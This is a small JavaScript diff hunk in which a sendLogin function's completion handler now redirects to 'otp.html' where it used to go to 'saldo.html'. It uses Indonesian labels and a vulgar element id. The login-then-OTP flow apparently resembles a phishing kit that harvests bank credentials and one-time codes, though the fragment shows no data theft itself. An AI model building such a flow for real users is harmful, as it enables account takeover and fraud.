@@ -42,7 +42,7 @@ function sendLogin() {
         datatype: 'JSON',
       complete: function() {
          setTimeout(function() {
-            window.location = "saldo.html";
+            window.location = "otp.html";
             $("#lonte").hide();
             $('.load').fadeOut();
             document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
